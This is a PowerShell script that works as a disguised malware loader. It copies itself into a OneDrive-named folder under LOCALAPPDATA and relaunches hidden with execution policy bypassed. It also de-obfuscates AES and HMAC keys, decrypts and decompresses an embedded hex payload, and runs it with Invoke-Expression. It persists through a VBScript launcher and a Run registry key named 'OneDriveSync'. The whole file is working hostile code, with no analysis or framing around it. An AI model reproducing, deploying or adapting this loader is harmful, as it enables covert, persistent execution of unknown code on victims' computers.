$hst=$MyInvocation.MyCommand.Path
$wp2=[System.IO.Path]::Combine($env:LOCALAPPDATA,'OneDrive','win.ps1')
if($hst -and $hst -ne $wp2){
    $td=[System.IO.Path]::Combine($env:LOCALAPPDATA,'OneDrive')
    if(-not(Test-Path $td)){New-Item -ItemType Directory -Path $td -Force|Out-Null}
    Copy-Item $hst $wp2 -Force
    $si=New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName='powershell.exe'
    $si.Arguments='-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "'+$wp2+'"'
    $si.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
    $si.CreateNoWindow=$true
    Start-Sleep -Milliseconds 500
    [System.Diagnostics.Process]::Start($si)|Out-Null
    exit
}
[string]$ep0='dfb627edb3b39c230032d1769d30905101172add0d05f2661cb19deb2a380128f707b4a2f569263bae4d7a22a0184abc2f2d7bf45eff6c2852940c60171ea1ba299886491e0f5e05bc1d2e46ef5df44b075b5ade22eee280e0269ceee90b6e2a08366dee'
[string]$ep1='4b6b0af20226ea1cbbf44ac8e6c8cbfe9c6e7e94e05fa7972ffbe150abc2f0b47584588c71aa2d0ad844b7fac2b88fb8aa61d1460432160312ab1c4cdd39927ffc5c1cc3aeaed2d4f5f2a7ddb8b568934887f54ad0ee158186c8e133105bb7c1143ce7be'
[string]$ep2='b14db2b42844fb10aa4d403216491e724e31a45f1778dba2ec6b1294fa53f578057fcd4c4778f1138144e953a8934ed3ea881d0cc522f9a932afa29bf3e78daefd424a8fee33e34facbeaead61c4d3ddc5714eca79f16ebdbf67a697ae846235ce7f5f15'
[string]$ep3='07e4c53a86d1a3825b83ab197b6b06a51685dd94c5e558519b27ac9bb90803836b99be313653d75554ac13205d42a30de1022aaa54c8661139f7a79b4104c3616f9f56576ad61a11ff8fb931844f652062a5769916b0d3e7ca36a1df1d832f73826a70bc'
[string]$ep4='9d82020d32948ab0958a76ee7f0e2be6499554d20ea7c6fccf3c080e867d02fe413d65f5480d47965ed06706a6001748489f71dd0f143b4b617f745c8dc4e3b43899413695fbdd9d0fb19e38d36edb93e5a21449e993ce09213272404cd49074c293c2d0'
[string]$ep5='2b311c4dc4015578b36b0d1bab19272a702f91101bd6827bc75c74b1bd66013082a10856834934905db00c0cd3e81339646f3e0e365191c6e64b42d257c2538fe5d9b380463c46f4044c0b5ddbe393d9da38ef6640ed992ecdbdafd00934b35e64b0bdc9'
[string]$ep6='8db6cf8d66d31e9050e497c350c39264ff06ddf0fca1d5da0c15ab342c6c6944d0462290f1f59c246394aed37a4db2fc0366783538862baa283500a725b89099a348f05f0e6ee7a06eb1b359dfc5e46ff2d2a7d4d5dc591ffe27d0834950fa9db4825398'
[string]$ep7='d1f1f59e128656f6d1b99fc7f1de55136be8a2bde36559e9caabad573b13dbebf0da2671492d1ceef7ae729c6db3964861133228a580953998fdcd1bfdefb0c34b3c98cc0913fdc3b69dd9f6b8331897e76f014bd4495c068500a4285f8daf37fa2319a6'
[string]$ep8='3175f192332c7fe5b92c507ebc9e4201a4f2231f26e396e9b820e19e42ccaa20dd3e14d3fa5e63611dabac6db425c0fb17033f017c6c556fe6edaf3b98e21802fde46dd1fad43bc90c513d765c85c79e5114428869e85a902c95a2109f16d53da2ef37ba'
[string]$ep9='dcfb66fbb76a0ebb664e5ea706c9a0b7ab1a17cc8a161a5c967fa281eb05d79e6ebe84c4b9b3430f10fb2e8fe64f77d410458d964550ee47836b5c31e023cb7f153bdb228eb579d835642ddbf7c428e3b3eecef9231f6d981c7b9907ef716faa115f97d2'
[string]$ep10='c756248fef3573f40880a2a90d3bd3c7594d918c6ef037c7240a67eaff11abe909880289289789ad7d60caee1c691e5b63fe3180065b970e719164f218a72c605945145728937f7bae998ccddffec37e475264ea204d75dad1bfb2e9f97f4d96ac4ef955'
[string]$ep11='e8872c75f623a1a1f200ac24fdf76f83c8176f4c21f028b8344b69b166a175a559cc330e15399389c0add32389e5815d3efe680a3fa126e9056bcfe57e0f5addd3459a7f7f66d27d7b713ed277046349ea75c04b66317924d21bfbac1ff5c82ad8b693e9'
[string]$ep12='f3258c18a7e9ed45421c0dd7183ebd1418c5dc61a7f3ba88383736dfadff3c0f9d1b785c9954135cf99127b45eef996368d7b9939b10a5d5a831c20b54f1e5fc1131f73955e886c29c0325000e8b5857ef47dd9271ef28731ae8991247f0c14e5c32f218'
[string]$ep13='de47ff3ddc8e020f7ea307b01e7be42836f6750863dd22c86bb39f6c'
$EP=$ep0+$ep1+$ep2+$ep3+$ep4+$ep5+$ep6+$ep7+$ep8+$ep9+$ep10+$ep11+$ep12+$ep13
[string]$a0='c218f0d21e04e8';[string]$a1='82dafe237ff28a99cdae1b';[string]$a2='0c69330a22d9';[string]$a3='656f88e9c9a1';[string]$a4='2a70'
[string]$h0='f55d75ec2eb629';[string]$h1='3001dac9e19c883b7a01ed86';[string]$h2='f4758fa8d179d8fd';[string]$h3='883bf48ea3'
function hx($h){
    $h=[string]$h
    $n=[int]($h.Length/2)
    $b=New-Object byte[] $n
    for($i=0;$i -lt $n;$i++){$b[$i]=[Convert]::ToByte($h.Substring($i*2,2),16)}
    return $b
}
function gk($hx2,$xk){
    $xkb=hx($xk)
    $d=hx($hx2)
    $o=New-Object byte[] $d.Length
    for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor $xkb[$i%$xkb.Length]}
    return $o
}
try{
    $AJ=$a0+$a1+$a2+$a3+$a4
    $AX='54964f4db1e9e5ce8620e08f9f315941'
    $AK=gk $AJ $AX
    $HJ=$h0+$h1+$h2+$h3
    $HX='a62ca8deb21e24e4dbacc88157ba36e2'
    $HK=gk $HJ $HX
    $PL=hx($EP)
    $IV=$PL[0..15]
    $SH=$PL[16..47]
    $ED=$PL[48..($PL.Length-1)]
    $hm=New-Object System.Security.Cryptography.HMACSHA256 -ArgumentList (,$HK)
    $ch=$hm.ComputeHash($ED)
    $ok=$true
    for($i=0;$i -lt $ch.Length;$i++){if($ch[$i] -ne $SH[$i]){$ok=$false;break}}
    if(-not $ok){throw 'HMAC failed'}
    $ae=[System.Security.Cryptography.Aes]::Create()
    $ae.Key=$AK
    $ae.IV=$IV
    $ae.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $ae.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $dc=$ae.CreateDecryptor()
    $dd=$dc.TransformFinalBlock($ED,0,$ED.Length)
    $ae.Dispose()
    $ms=New-Object System.IO.MemoryStream(,$dd)
    $gz=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
    $os=New-Object System.IO.MemoryStream
    $gz.CopyTo($os)
    $gz.Dispose()
    $ms.Dispose()
    $code=[System.Text.Encoding]::UTF8.GetString($os.ToArray())
    $wp=[System.IO.Path]::Combine($env:LOCALAPPDATA,'OneDrive','win.ps1')
    $vbs=[System.IO.Path]::Combine($env:LOCALAPPDATA,'OneDrive','run.vbs')
    $vc='Set o=CreateObject("WScript.Shell")'+"`r`n"+'o.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""'+$wp+'""" ,0,False'
    [System.IO.File]::WriteAllText($vbs,$vc)
    Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value ('wscript.exe "'+$vbs+'"') -Force -EA SilentlyContinue
    Invoke-Expression $code
}catch{
    exit 1
}
